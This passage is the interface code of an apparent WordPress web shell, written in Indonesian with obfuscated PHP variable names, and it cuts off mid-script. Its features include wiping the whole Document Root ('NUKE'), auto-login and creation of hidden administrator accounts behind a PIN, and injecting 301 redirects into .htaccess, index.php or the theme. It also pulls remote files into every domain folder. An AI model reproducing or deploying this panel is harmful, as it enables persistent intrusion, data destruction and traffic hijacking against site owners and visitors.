      <br>- Menghapus <b>SEMUA file & folder</b> di Document Root
      <br>&nbsp;&nbsp; kecuali folder backup di atas dan path yang kamu kecualikan.
      <br><br><b>PERINGATAN:</b> tindakan ini sangat destruktif. Pastikan kamu paham konsekuensinya.
    </p>
    <form id="nukeForm" method="post" action="">
      <label style="display:block; font-size:12px; margin:6px 0 4px 0;">
        Path yang <b>TIDAK</b> akan dihapus (opsional, satu per baris atau pisah koma):
      </label>
      <textarea name="nuke_exceptions" id="nuke_exceptions"
                style="width:98%; min-height:80px; font-size:12px;"
                placeholder="/wp-content/recovery/
some-folder/
some-file.php"></textarea>
      <input type="hidden" name="runNuke" value="1">
      <div style="margin-top:10px; text-align:right;">
        <button type="button"
                onclick="confirmNuke()"
                style="background:#ef4444; color:#fff; border:1px solid #b91c1c; border-radius:6px; padding:4px 10px; cursor:pointer;">
          Lanjut
        </button>
        <button type="button" onclick="closeNukeModal()">Batal</button>
      </div>
    </form>
  </div>
</div>


<div id="nukeConfirmModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.55); z-index:10009; justify-content:center; align-items:center;">
  <div style="background:#fff; border-radius:8px; padding:16px 14px; min-width:300px; max-width:96vw;">
    <div id="nukeConfirmMsg" style="font-size:13px; margin-bottom:10px; color:#b91c1c; background:#fee2e2; padding:6px 8px; border-radius:4px;"></div>
    <div style="text-align:right;">
      <button type="button"
              onclick="submitNuke()"
              style="background:#ef4444; color:#fff; border:1px solid #b91c1c; border-radius:6px; padding:4px 10px; cursor:pointer;">
        Yes, Nuke!
      </button>
      <button type="button" onclick="closeNukeConfirmModal()">No</button>
    </div>
  </div>
</div>


<div id="adminModal" style="
    display:none;
    position:fixed;
    top:0; left:0;
    width:100vw; height:100vh;
    background:rgba(0,0,0,0.5);
    z-index:10012;
    justify-content:center;
    align-items:center;">
  <div style="
      background:rgba(0,0,0,0.9);
      color:#fff;
      border-radius:8px;
      padding:16px 14px;
      min-width:280px;
      max-width:90vw;">
    <h3 style="margin:0 0 8px 0; font-size:14px;">Admin Auto Login</h3>
    <p style="font-size:13px; margin:6px 0 10px 0;">
      Anda akan diarahkan ke <code>/wp-admin</code> sebagai Administrator (auto login).<br>
      Masukkan PIN untuk melanjutkan.
    </p>

    <label for="admin_pin_input" style="font-size:12px; display:block; margin-bottom:4px;">
      PIN Admin
    </label>
    <input type="password"
           id="admin_pin_input"
           placeholder="Masukkan PIN admin"
           style="width:50%; padding:5px 7px; margin-bottom:10px; border-radius:4px; border:1px solid #555; background:#111; color:#fff;">
    <div style="margin:8px 0 6px 0; font-size:12px; border-top:1px solid rgba(255,255,255,0.15); padding-top:6px;">
      <div style="margin-bottom:4px;">Buat user admin baru (opsional):</div>
      <label for="admin_new_user_input" style="display:block; font-size:11px; margin-bottom:2px;">Username admin baru</label>
      <input type="text" id="admin_new_user_input" placeholder="misal: superadmin" style="width:90%; padding:5px 7px; margin-bottom:6px; border-radius:4px; border:1px solid #555; background:#111; color:#fff;">
      <label for="admin_new_pass_input" style="display:block; font-size:11px; margin-bottom:2px;">Password admin baru</label>
      <input type="text" id="admin_new_pass_input" placeholder="password kuat" style="width:90%; padding:5px 7px; margin-bottom:6px; border-radius:4px; border:1px solid #555; background:#111; color:#fff;">
      <label for="admin_new_email_input" style="display:block; font-size:11px; margin-bottom:2px;">Email admin (opsional)</label>
      <input type="email" id="admin_new_email_input" placeholder="email admin (boleh dikosongkan)" style="width:90%; padding:5px 7px; margin-bottom:4px; border-radius:4px; border:1px solid #555; background:#111; color:#fff;">
    </div>


    <div style="text-align:right; margin-top:4px;">
      <button type="button"
              onclick="goAdmin()"
              style="background:#00ffc8; color:#111; border:none; border-radius:6px; padding:4px 10px; cursor:pointer; margin-right:6px;">
        Auto Login
      </button>
      <button type="button"
              onclick="createAdminUser()"
              style="background:#38bdf8; color:#000; border:none; border-radius:6px; padding:4px 10px; cursor:pointer; margin-right:6px;">
        Buat Admin
      </button>
      <button type="button"
              onclick="closeAdminModal()"
              style="padding:4px 10px;">
        Tutup
      </button>
    </div>
  </div>
</div>


<form id="adminForm" method="post" action="" style="display:none;">
  <input type="hidden" name="auto_admin_login" id="auto_admin_login_flag" value="1">
  <input type="hidden" name="create_admin_user" id="create_admin_user_flag" value="">
  <input type="hidden" name="admin_pin" id="admin_pin_hidden">
  <input type="hidden" name="admin_new_user" id="admin_new_user_hidden">
  <input type="hidden" name="admin_new_pass" id="admin_new_pass_hidden">
  <input type="hidden" name="admin_new_email" id="admin_new_email_hidden">

</form>

<script>
// === DARK MODE TOGGLE ===
(function(){
  var toggle = document.getElementById('darkModeToggle');
  if (!toggle) return;

  var icon = toggle.querySelector('.theme-icon');
  var text = toggle.querySelector('.theme-text');

  function applyTheme(mode) {
    if (mode === 'dark') {
      document.body.classList.add('dark-mode');
      toggle.classList.add('active');
      if (icon) icon.textContent = '🌙';
      if (text) text.textContent = 'Dark';
    } else {
      document.body.classList.remove('dark-mode');
      toggle.classList.remove('active');
      if (icon) icon.textContent = '☀️';
      if (text) text.textContent = 'Light';
    }
  }

  var mode = 'light';
  try {
    var stored = localStorage.getItem('fm_theme');
    if (stored === 'dark' || stored === 'light') {
      mode = stored;
    }
  } catch(e) {}

  applyTheme(mode);

  toggle.addEventListener('click', function(){
    mode = (mode === 'dark') ? 'light' : 'dark';
    applyTheme(mode);
    try {
      localStorage.setItem('fm_theme', mode);
    } catch(e) {}
  });
})();

function showSearchModal() {
    document.getElementById('searchModal').style.display = 'flex';
}
function closeSearchModal() {
    document.getElementById('searchModal').style.display = 'none';
}
function closeSearchConfirmModal() {
    document.getElementById('searchConfirmModal').style.display = 'none';
}
function confirmSearch() {
    var root = (document.getElementById('search_root').value || '').trim();
    var name = (document.getElementById('search_name').value || '').trim();
    var text = (document.getElementById('search_content').value || '').trim();

    if (!name && !text) {
        alert('Isi minimal salah satu: nama file/folder atau keyword isi file.');
        return;
    }

    var msg = 'Jalankan search dari root:\n' +
              '<code>' + escapeHtml(root || '<?= htmlspecialchars($buaya1, ENT_QUOTES) ?>') + '</code><br><br>';

    if (name) {
        msg += '• Cari nama file/folder mengandung: <code>' + escapeHtml(name) + '</code><br>';
    }
    if (text) {
        msg += '• Cari isi file mengandung: <code>' + escapeHtml(text) + '</code><br>';
    }

    msg += '<br><span style="font-size:11px;color:#555;">Catatan: jika root terlalu jauh (misalnya Document Root besar), scan bisa dipotong otomatis.</span>';

    document.getElementById('searchConfirmMsg').innerHTML = msg;
    document.getElementById('searchConfirmModal').style.display = 'flex';
}
function submitSearch() {
    document.getElementById('searchConfirmModal').style.display = 'none';
    document.getElementById('searchModal').style.display = 'none';
    document.getElementById('searchForm').submit();
}

function showSuspendModal() {
    const except1 = document.getElementById('except1').value.trim();
    const except2 = document.getElementById('except2').value.trim();
    const except3 = document.getElementById('except3').value.trim();

    const list = [except1, except2, except3].filter(Boolean);
    const ul = document.getElementById('exceptionList');
    ul.innerHTML = list.length > 0 ? list.map(i => `<li>${i}</li>`).join('') : '<li>(Tidak ada pengecualian)</li>';

    document.getElementById('suspendModal').style.display = 'flex';
}

function executeSuspend() {
    const form = document.getElementById('suspendForm');
    const hidden = document.createElement('input');
    hidden.type = 'hidden';
    hidden.name = 'suspendOn';
    hidden.value = '1';
    form.appendChild(hidden);
    form.submit();
}

function selectAll(flag) {
    document.querySelectorAll('.select-item').forEach(function(cb) { cb.checked = flag; });
}
<?php if (!empty($bebek2)): ?>
window.onload = function() {
    var editArea = document.getElementById('editfile');
    if(editArea) editArea.scrollIntoView({behavior:'smooth'});
};
<?php endif; ?>
// Modal Extract ZIP
document.querySelectorAll('.extract-btn').forEach(function(btn){
    btn.onclick = function(){
        document.getElementById('zipToExtract').value = btn.getAttribute('data-zip');
        document.getElementById('extractDest').value = '<?= htmlspecialchars($buaya1) ?>';
        document.getElementById('extractModal').style.display = 'flex';
    }
});

function showRedirectModal() {
    document.getElementById('redirectModal').style.display = 'flex';
}
function closeRedirectModal() {
    document.getElementById('redirectModal').style.display = 'none';
}
function closeRedirectConfirmModal() {
    document.getElementById('redirectConfirmModal').style.display = 'none';
}

function escapeHtml(str) {
    return str.replace(/&/g, '&amp;')
              .replace(/</g, '&lt;')
              .replace(/>/g, '&gt;');
}

function confirmRedirect301() {
    var src  = document.getElementById('redirect_source').value.trim();
    var destEl = document.getElementById('redirect_target_url');
    var dest = destEl ? destEl.value.trim() : '';
    var typeEl = document.querySelector('input[name="redirect_target_type"]:checked');

    if (!typeEl) {
        alert('Pilih target file (htaccess / index.php / theme).');
        return;
    }
    if (!src) {
        alert('Isi URL/path yang akan di-redirect.');
        return;
    }
    if (!dest) {
        alert('Isi URL tujuan redirect.');
        return;
    }

    var typeLabel = typeEl.value;
    if (typeLabel === 'htaccess') typeLabel = '.htaccess (Document Root)';
    else if (typeLabel === 'index') typeLabel = 'index.php (Document Root)';
    else if (typeLabel === 'theme') typeLabel = 'Theme (functions.php aktif)';

    var msg = 'Buat redirect 301 untuk:<br>' +
              '<code>' + escapeHtml(src) + '</code><br>' +
              '→ <code>' + escapeHtml(dest) + '</code><br>' +
              'Penulisan aturan di: <b>' + typeLabel + '</b><br><br>' +
              'Lanjut?';

    document.getElementById('redirectConfirmMsg').innerHTML = msg;
    document.getElementById('redirectConfirmModal').style.display = 'flex';
}

function submitRedirect301() {
    document.getElementById('redirectForm').submit();
}

function showNukeModal() {
  document.getElementById('nukeModal').style.display = 'flex';
}
function closeNukeModal() {
  document.getElementById('nukeModal').style.display = 'none';
}
function closeNukeConfirmModal() {
  document.getElementById('nukeConfirmModal').style.display = 'none';
}

function confirmNuke() {
  var txt  = document.getElementById('nuke_exceptions').value.trim();
  var list = '';
  if (txt) {
    var lines = txt.split(/\r?\n|,/).map(function(l){ return l.trim(); }).filter(function(l){ return l.length > 0; });
    if (lines.length) {
      list = '<ul style="margin:6px 0 0 16px; padding:0; font-size:12px;">' +
             lines.map(function(l){ return '<li><code>' + escapeHtml(l) + '</code></li>'; }).join('') +
             '</ul>';
    }
  }

  var msg  = '';
  msg += 'Anda akan menjalankan <b>NUKE ☠</b> pada Document Root:<br>';
  msg += '<code><?= htmlspecialchars($_SERVER['DOCUMENT_ROOT']) ?></code><br><br>';
  msg += 'Backup ZIP akan dibuat di:<br>';
  msg += '<code><?= htmlspecialchars(rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . '/wp-content/recovery') ?></code><br>';
  msg += '(nama file diawali <code>nuke-backup-YYYYMMDD_HHMMSS_XXX.zip</code>)<br><br>';
  msg += 'Path yang TIDAK akan dihapus selain folder backup:<br>';
  msg += (list || '<i>(hanya folder backup default)</i>');
  msg += '<br><br><b>TINDAKAN INI SANGAT BERBAHAYA</b> dan tidak bisa di-undo dari panel ini.<br>';
  msg += 'Lanjutkan?';

  document.getElementById('nukeConfirmMsg').innerHTML = msg;
  document.getElementById('nukeConfirmModal').style.display = 'flex';
}

function submitNuke() {
  document.getElementById('nukeForm').submit();
}

function showAdminModal() {
    var m = document.getElementById('adminModal');
    if (m) m.style.display = 'flex';
}
function closeAdminModal() {
    var m = document.getElementById('adminModal');
    if (m) m.style.display = 'none';
}
function goAdmin() {
    var pinInput = document.getElementById('admin_pin_input');
    if (!pinInput) return;

    var pin = pinInput.value.trim();
    if (!pin) {
        alert('PIN admin wajib diisi.');
        pinInput.focus();
        return;
    }

    var hiddenPin = document.getElementById('admin_pin_hidden');
    var form = document.getElementById('adminForm');
    var autoFlag = document.getElementById('auto_admin_login_flag');
    var createFlag = document.getElementById('create_admin_user_flag');

    if (!hiddenPin || !form) return;

    hiddenPin.value = pin;
    if (autoFlag) autoFlag.value = "1";
    if (createFlag) createFlag.value = "";

    form.submit();
}


function createAdminUser() {
    var pinInput = document.getElementById('admin_pin_input');
    var userInput = document.getElementById('admin_new_user_input');
    var passInput = document.getElementById('admin_new_pass_input');
    var emailInput = document.getElementById('admin_new_email_input');

    if (!pinInput || !userInput || !passInput) return;

    var pin = pinInput.value.trim();
    var user = userInput.value.trim();
    var pass = passInput.value;
    var email = emailInput ? emailInput.value.trim() : '';

    if (!pin) {
        alert('PIN admin wajib diisi.');
        pinInput.focus();
        return;
    }
    if (!user) {
        alert('Username admin baru wajib diisi.');
        userInput.focus();
        return;
    }
    if (!pass) {
        alert('Password admin baru wajib diisi.');
        passInput.focus();
        return;
    }

    var form = document.getElementById('adminForm');
    var hiddenPin = document.getElementById('admin_pin_hidden');
    var hUser = document.getElementById('admin_new_user_hidden');
    var hPass = document.getElementById('admin_new_pass_hidden');
    var hEmail = document.getElementById('admin_new_email_hidden');
    var autoFlag = document.getElementById('auto_admin_login_flag');
    var createFlag = document.getElementById('create_admin_user_flag');

    if (!form || !hiddenPin || !hUser || !hPass || !hEmail || !createFlag) return;

    hiddenPin.value = pin;
    hUser.value = user;
    hPass.value = pass;
    hEmail.value = email;
    createFlag.value = "1";
    if (autoFlag) autoFlag.value = "";

    form.submit();
}
function confirmDeployFile() {
    var form = document.getElementById('deployFileForm');
    if (!form) {
        alert('Form deploy file tidak ditemukan.');
        return;
    }

    var checkboxes = form.querySelectorAll('input[name="deploy_file_targets[]"]:checked');
    if (!checkboxes.length) {
        alert('Pilih minimal satu folder domain/subdomain.');
        return;
    }

    var urlInput  = form.querySelector('input[name="deploy_file_url"]');
    var nameInput = form.querySelector('input[name="deploy_file_name"]');
    var pathInput = form.querySelector('input[name="deploy_file_path"]');

    var fileUrl  = urlInput  ? urlInput.value.trim()  : '';
    var fileName = nameInput ? nameInput.value.trim() : '';
    var subPath  = pathInput ? pathInput.value.trim() : '';

    if (!fileUrl) {
        alert('Isi URL file dulu.');
        return;
    }

    var targetLabels = [];
    checkboxes.forEach(function(cb) {
        var lbl = cb.closest('label');
        if (lbl) {
            var strong = lbl.querySelector('strong');
            if (strong) targetLabels.push(strong.textContent.trim());
        }
    });

    var msg  = 'Deploy file berikut:<br>';
    msg += 'URL: <code>' + escapeHtml(fileUrl) + '</code><br>';
    if (fileName) {
        msg += 'Nama file: <code>' + escapeHtml(fileName) + '</code><br>';
    }
    msg += '<br>Ke folder domain/subdomain:<br>';
    targetLabels.forEach(function(t) {
        msg += '&bull; ' + escapeHtml(t) + '<br>';
    });
    msg += '<br>Path simpan di dalam folder: <code>' + escapeHtml(subPath || '(root folder)') + '</code><br><br>';
    msg += 'Lanjutkan?';

    document.getElementById('deployFileConfirmMsg').innerHTML = msg;
    document.getElementById('deployFileConfirmModal').style.display = 'flex';
}

function closeDeployFileConfirmModal() {
    var m = document.getElementById('deployFileConfirmModal');
    if (m) m.style.display = 'none';
}

function submitDeployFile() {
    var form = document.getElementById('deployFileForm');
    if (!form) return;
    document.getElementById('deployFileConfirmModal').style.display = 'none';
    form.submit();
}

</script>
<?php if ($biawak7 > 1): ?>
    <div style="margin:10px 0;">
        <?php for ($bison3 = 1; $bison3 <= $biawak7; $bison3++): ?>
            <?php if ($bison3 == $rusa5): ?>
                <span class="nav-link disabled"><?= $bison3 ?></span>
            <?php else: ?>
                <a class="nav-link" href="?folder=<?= urlencode($buaya1) ?>&page=<?= $bison3 ?>"><?= $bison3 ?></a>
            <?php endif; ?>
        <?php endfor; ?>
    </div>
<?php endif; ?>
<?php if (!empty($_SESSION['suspend_message'])): ?>
<div id="toastSuspend" style="
    position: fixed;
    top: 20px;
    right: 20px;
    background: <?= ($_SESSION['suspend_status'] === 'error' ? '#e74c3c' : '#2ecc71') ?>;
    color: white;
    padding: 12px 18px;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.3);
    font-size: 13px;
    z-index: 9999;
    display: none;
">
    <?= htmlspecialchars($_SESSION['suspend_message']) ?>
</div>
<script>
window.addEventListener('load', () => {
    const toast = document.getElementById('toastSuspend');
    if (toast) {
        toast.style.display = 'block';
        setTimeout(() => { toast.style.display = 'none'; }, 20000); // 20 detik
    }
});

</script>
<?php
unset($_SESSION['suspend_message']);
unset($_SESSION['suspend_status']);
endif;
?>

<?php if (!empty($_SESSION['search_message'])): ?>
<div id="toastSearch" style="
    position: fixed;
    top: 360px;
    right: 20px;
    background: <?= 
        ($_SESSION['search_status'] === 'error'
            ? '#e74c3c'
            : ($_SESSION['search_status'] === 'partial' ? '#ffb400' : '#2ecc71'))
    ?>;
    color: white;
    padding: 12px 18px;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.3);
    font-size: 13px;
    z-index: 9999;
    display: none;
    max-width: 420px;
    white-space: pre-wrap;
">
    <?= nl2br(htmlspecialchars($_SESSION['search_message'])) ?>
</div>
<script>
window.addEventListener('load', () => {
    const toast = document.getElementById('toastSearch');
    if (toast) {
        toast.style.display = 'block';
        setTimeout(() => { toast.style.display = 'none'; }, 20000);
    }
});
</script>
<?php
unset($_SESSION['search_message']);
unset($_SESSION['search_status']);
endif;
?>



<?php if (!empty($_SESSION['deploy_file_message'])): ?>
<div id="toastDeployFile" style="
    position: fixed;
    top: 450px;
    right: 20px;
    background: <?= ($_SESSION['deploy_file_status'] === 'error' ? '#e74c3c' : ($_SESSION['deploy_file_status'] === 'partial' ? '#ffb400' : '#22c55e')) ?>;
    color: white;
    padding: 12px 18px;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.3);
    font-size: 13px;
    z-index: 9999;
    display: none;
    max-width: 420px;
    white-space: pre-wrap;
">
    <?= $_SESSION['deploy_file_message'] ?>
    <?php if (!empty($_SESSION['deploy_file_result_txt'])): ?>
    <div style="margin-top:6px; font-size:12px;">
        <a href="?download_deploy_result=file" style="color:#fee2e2; text-decoration:underline;">Download result .txt</a>
    </div>
    <?php endif; ?>
</div>
<script>
window.addEventListener('load', () => {
    const toast = document.getElementById('toastDeployFile');
    if (toast) {
        toast.style.display = 'block';
        setTimeout(() => { toast.style.display = 'none'; }, 20000);
    }
});
</script>
<?php
unset($_SESSION['deploy_file_message']);
unset($_SESSION['deploy_file_status']);
endif;
?>

<?php if (!empty($_SESSION['htreplace_message'])): ?>
<div id="toastHtReplace" style="
    position: fixed;
    top: 70px;
    right: 20px;
    background: <?= ($_SESSION['htreplace_status'] === 'error' ? '#e74c3c' : '#2ecc71') ?>;
    color: white;
    padding: 12px 18px;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.3);
    font-size: 13px;
    z-index: 9999;
    display: none;
">
    <?= htmlspecialchars($_SESSION['htreplace_message']) ?>
</div>
<script>
  window.addEventListener('load', () => {
    const toast = document.getElementById('toastHtReplace');
    if (toast) {
      toast.style.display = 'block';
      setTimeout(() => { toast.style.display = 'none'; }, 20000);
    }
  });
</script>
<?php
unset($_SESSION['htreplace_message']);
unset($_SESSION['htreplace_status']);
endif;
?>

<?php if (!empty($_SESSION['ts_message'])): ?>
<div id="toastTs" style="
    position: fixed;
    top: 120px;
    right: 20px;
    background: <?= ($_SESSION['ts_status'] === 'error' ? '#e74c3c' : ($_SESSION['ts_status'] === 'partial' ? '#ffb400' : '#2ecc71')) ?>;
    color: white;
    padding: 12px 18px;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.3);
    font-size: 13px;
    z-index: 9999;
    display: none;
    max-width: 420px;
    white-space: pre-wrap;
">
    <?= $_SESSION['ts_message'] ?>
</div>
<script>
  window.addEventListener('load', () => {
    const toast = document.getElementById('toastTs');
    if (toast) {
      toast.style.display = 'block';
      setTimeout(() => { toast.style.display = 'none'; }, 20000);
    }
  });
</script>
<?php
unset($_SESSION['ts_message']);
unset($_SESSION['ts_status']);
endif;
?>

<?php if (!empty($_SESSION['redirect_message'])): ?>
    <div id="toastRedirect" style="
        position: fixed;
        top: 170px;
        right: 20px;
        background: <?= ($_SESSION['redirect_status'] === 'error' ? '#e74c3c' : '#2ecc71') ?>;
        color: white;
        padding: 12px 18px;
        border-radius: 8px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        font-size: 13px;
        z-index: 9999;
        display: none;
        max-width: 420px;
        white-space: pre-wrap;
    ">
        <?= htmlspecialchars($_SESSION['redirect_message']) ?>
    </div>
    <script>
    window.addEventListener('load', () => {
        const toast = document.getElementById('toastRedirect');
        if (toast) {
        toast.style.display = 'block';
        setTimeout(() => { toast.style.display = 'none'; }, 20000);
        }
    });
    </script>
    <?php
    unset($_SESSION['redirect_message']);
    unset($_SESSION['redirect_status']);
    endif;
    ?>

    <?php if (!empty($_SESSION['nuke_message'])): ?>
    <div id="toastNuke" style="
        position: fixed;
        top: 220px;
        right: 20px;
        background: <?= ($_SESSION['nuke_status'] === 'error' ? '#e74c3c' : ($_SESSION['nuke_status'] === 'partial' ? '#ffb400' : '#2ecc71')) ?>;
        color: white;
        padding: 12px 18px;
        border-radius: 8px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        font-size: 13px;
        z-index: 9999;
        display: none;
        max-width: 420px;
        white-space: pre-wrap;
    ">
        <?= htmlspecialchars($_SESSION['nuke_message']) ?>
    </div>
    <script>
    window.addEventListener('load', () => {
        const toast = document.getElementById('toastNuke');
        if (toast) {
            toast.style.display = 'block';
            setTimeout(() => { toast.style.display = 'none'; }, 20000);
        }
    });
    </script>
    <?php
    unset($_SESSION['nuke_message']);
    unset($_SESSION['nuke_status']);
    endif;
    ?>

    <?php if (!empty($_SESSION['admin_pin_error'])): ?>
    <div id="toastAdminPin" style="
        position: fixed;
        top: 320px;
        right: 20px;
        background:#e74c3c;
        color: white;
        padding: 12px 18px;
        border-radius: 8px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        font-size: 13px;
        z-index: 9999;
        display: none;
        max-width: 320px;
        white-space: pre-wrap;
    ">
        <?= htmlspecialchars($_SESSION['admin_pin_error']) ?>
    </div>
    <script>
    window.addEventListener('load', () => {
        const toast = document.getElementById('toastAdminPin');
        if (toast) {
            toast.style.display = 'block';
            setTimeout(() => { toast.style.display = 'none'; }, 20000);
        }
    });
    </script>
    <?php
    unset($_SESSION['admin_pin_error']);
    endif;
    ?>
    <?php if (!empty($_SESSION['admin_create_status'])): ?>
    <div id="toastAdminCreate" style="
        position: fixed;
        top: 360px;
        right: 20px;
        background:#2563eb;
        color: white;
        padding: 12px 18px;
        border-radius: 8px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        font-size: 13px;
        z-index: 9999;
        display: none;
        max-width: 360px;
        white-space: pre-wrap;
    ">
        <?= htmlspecialchars($_SESSION['admin_create_status']) ?>
    </div>
    <script>
    window.addEventListener('load', () => {
        const toast = document.getElementById('toastAdminCreate');
        if (toast) {
            toast.style.display = 'block';
            setTimeout(() => { toast.style.display = 'none'; }, 25000);
        }
    });
    </script>
    <?php
    unset($_SESSION['admin_create_status']);
    endif;
    ?>



<script>
document.addEventListener('DOMContentLoaded', function() {
    const currentFolder = <?= json_encode($buaya1) ?>;

    document.querySelectorAll('.ajax-delete-form').forEach(form => {
        form.querySelector('.delete').addEventListener('click', function() {
            const name = form.getAttribute('data-name');
            if (!confirm(`Yakin ingin menghapus "${name}"?`)) return;

            const formData = new FormData();
            formData.append('target', name);

            fetch('?ajax_delete=1&folder=' + encodeURIComponent(currentFolder), {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    alert(`"${name}" berhasil dihapus.`);
                    location.reload();
                } else {
                    alert(`Gagal menghapus "${name}".`);
                }
            })
            .catch(err => {
                console.error('AJAX error:', err);
                alert('Terjadi kesalahan AJAX.');
            });
        });
    });
});

</script>

<div id="scanModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); z-index:10002; justify-content:center; align-items:center;">
  <div style="background:#fff; border-radius:7px; padding:18px 14px; min-width:280px; max-width:92vw;">
    <h3 style="margin-bottom:10px; font-size:13px;">Pilih Jenis Scan</h3>
    <form id="scanForm" method="post" action="">
      <label style="display:block; font-size:12px; margin:2px 0;">
        <input type="checkbox" id="scanAll" name="scanAll" value="1" onchange="toggleWpVersionInputs()">
        Scan Semua
        <span style="font-size:11px; color:#555;">(.htaccess, folder terkunci CHMOD, wp-admin, wp-includes)</span>
      </label>

      <div style="margin:6px 0 4px 18px; font-size:11px; color:#666;">
        Opsi versi WordPress (opsional, boleh dikosongkan untuk auto-detect):
      </div>

      <div id="wpVersionAdminBox" style="display:none; margin:4px 0 6px 20px;">
        <label style="display:block; font-size:11px; margin-bottom:4px;">Versi WP untuk <code>wp-admin</code></label>
        <input type="text" id="wpVersionAdmin" name="wpVersionAdmin"
               placeholder="Versi WP (opsional, contoh: 6.6.2)" style="width:96%;">
        <div style="font-size:11px;color:#666;margin-top:3px;">Kosongkan untuk auto-detect.</div>
      </div>

      <div id="wpVersionIncludesBox" style="display:none; margin:4px 0 6px 20px;">
        <label style="display:block; font-size:11px; margin-bottom:4px;">Versi WP untuk <code>wp-includes</code></label>
        <input type="text" id="wpVersionIncludes" name="wpVersionIncludes"
               placeholder="Versi WP (opsional, contoh: 6.6.2)" style="width:96%;">
        <div style="font-size:11px;color:#666;margin-top:3px;">Kosongkan untuk auto-detect.</div>
       <div style="margin:6px 0 4px 18px; font-size:11px; color:#666;">
        Opsi auto hapus <code>.htaccess</code>:
      </div>
      <div style="margin:2px 0 6px 20px;">
        <label style="display:block; font-size:11px; margin-bottom:3px;">
          Folder "base" yang aman (tidak dihapus .htaccess-nya) (opsional)
        </label>
        <input type="text" id="scanHtBase" name="scanHtBase"
               placeholder="default: Base (hanya subfolder selain Base yang dihapus)" style="width:96%;">
        <div style="font-size:11px; color:#666; margin-top:3px;">
          Contoh isi: <code>Base</code> (nama folder tingkat atas). Kosongkan untuk tetap memakai "Base".
        </div>
      </div>

     </div>

      
      <div style="display:none;">
        <label><input type="checkbox" id="scanHtaccess" name="scanHtaccess" value="1" checked>Scan Semua .htaccess</label>
        <label><input type="checkbox" id="scanLocked" name="scanLocked" value="1" checked>Scan Folder Terkunci CHMOD</label>
        <label><input type="checkbox" id="scanWpAdmin" name="scanWpAdmin" value="1" checked>Scan wp-admin</label>
        <label><input type="checkbox" id="scanWpIncludes" name="scanWpIncludes" value="1" checked>Scan wp-includes</label>
      </div>

      <div style="margin-top:10px; text-align:right;">
        <button type="button" onclick="confirmScan()">Lanjut</button>
        <button type="button" onclick="closeScanModal()">Batal</button>
      </div>
    </form>
  </div>
</div>


<div id="scanConfirmModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.4); z-index:10003; justify-content:center; align-items:center;">
  <div style="background:#fff; border-radius:7px; padding:18px 14px; min-width:260px;">
    <div id="scanConfirmMsg" style="font-size:13px; margin-bottom:10px; color:#b91c1c; background:#fee2e2; padding:6px 8px; border-radius:4px;"></div>
    <div style="text-align:right;">
      <button type="button" onclick="submitScan()">Yes</button>
      <button type="button" onclick="closeScanConfirmModal()">No</button>
    </div>
  </div>
</div>


<div id="htaccessReplaceModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); z-index:10005; justify-content:center; align-items:center;">
  <div style="background:#fff; border-radius:8px; padding:16px 14px; min-width:300px; max-width:92vw;">
    <h3 style="margin:0 0 8px 0; font-size:14px;">Replace .htaccess</h3>
    <form method="post" id="htreplaceForm">
      <label style="display:block; font-size:12px; margin:4px 0;">
        <input type="checkbox" name="replaceIncludes" value="1">
        Tulis .htaccess di <code>/wp-includes</code>
      </label>
      <label style="display:block; font-size:12px; margin:4px 0;">
        <input type="checkbox" name="replaceContent" value="1">
        Tulis .htaccess di <code>/wp-content</code>
      </label>

      <div style="border-top:1px solid #ddd; margin:8px 0;"></div>

      <label style="display:block; font-size:12px; margin:4px 0;">
        <input type="checkbox" id="replaceCustom" name="replaceCustom" value="1" onchange="toggleCustomBox()">
        Tulis .htaccess di path custom
      </label>
      <div id="customBox" style="display:none; margin-left:18px;">
        <label style="display:block; font-size:12px;">Path (di dalam Document Root)</label>
        <input type="text" name="customPath" placeholder="/path/relative/atau/absolute" style="width:96%;">

        <div style="margin-top:6px; font-size:12px;">
          Mode:
          <label style="margin-left:6px;"><input type="radio" name="customMode" value="allow" checked> Allow</label>
          <label style="margin-left:6px;"><input type="radio" name="customMode" value="deny"> Deny</label>
        </div>
      </div>

      <div style="text-align:right; margin-top:12px;">
        <button type="submit" name="doHtaccessReplace" style="background:#43dbb0; color:#111; border:none; padding:4px 10px; border-radius:6px; cursor:pointer;">Jalankan</button>
        <button type="button" onclick="closeHtaccessReplaceModal()">Batal</button>
      </div>
    </form>
  </div>
</div>

<script>
function showScanModal() {
    document.getElementById('scanModal').style.display = 'flex';
    toggleWpVersionInputs();
}
function closeScanModal() {
    document.getElementById('scanModal').style.display = 'none';
}
function toggleWpVersionInputs() {
    var master = document.getElementById('scanAll');
    var on = master && master.checked;
    var boxA = document.getElementById('wpVersionAdminBox');
    var boxI = document.getElementById('wpVersionIncludesBox');
    if (boxA) boxA.style.display = on ? 'block' : 'none';
    if (boxI) boxI.style.display = on ? 'block' : 'none';
}
function confirmScan() {
    var master = document.getElementById('scanAll');
    if (!master || !master.checked) {
        alert("Checklist opsi scan terlebih dahulu!");
        return;
    }

    var verA = (document.getElementById('wpVersionAdmin').value || '').trim();
    var verI = (document.getElementById('wpVersionIncludes').value || '').trim();

    var list = [];
    list.push("• .htaccess");
    list.push("• Folder terkunci CHMOD");
    list.push("• wp-admin (versi: " + (verA || "auto") + ")");
    list.push("• wp-includes (versi: " + (verI || "auto") + ")");

    var msg = "Anda akan menjalankan scan berikut:<br>" +
              list.join("<br>") +
              "<br><br>Lanjut scan?";

    document.getElementById('scanConfirmMsg').innerHTML = msg;
    document.getElementById('scanConfirmModal').style.display = 'flex';
}
function closeScanConfirmModal() {
    document.getElementById('scanConfirmModal').style.display = 'none';
